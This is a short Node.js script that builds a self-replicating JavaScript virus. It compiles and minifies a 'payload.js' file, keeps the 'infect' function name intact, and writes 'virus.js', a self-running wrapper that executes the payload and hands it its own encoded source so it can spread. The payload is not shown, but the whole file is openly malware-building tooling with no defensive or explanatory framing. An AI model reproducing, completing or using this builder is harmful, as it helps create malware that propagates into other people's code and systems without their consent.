const fs      = require( "fs-extra" );
const babel   = require( "babel-core" );
const winston = require( "winston" );
const ugly    = require( "uglify-js" );

async function build() {
    var src = await fs.readFile( "payload.js", "utf8" );
    var compiled = babel.transform( src, { presets : require.resolve( "babel-preset-es2015" ) } ).code;
    var minified = ugly.minify( compiled, { mangle : { reserved : [ "infect" ] } } );
    var payload = encodeURI(minified.code);

    await fs.writeFile( "virus.js", `(function() {
        ${decodeURI(payload)} 
        infect( "${payload}" );
    })();` );
}

build()
    .then( () => winston.info( "BUILD SUCCEEDED" ) )
    .catch( e => winston.info( "BUILD FAILED", e ) );
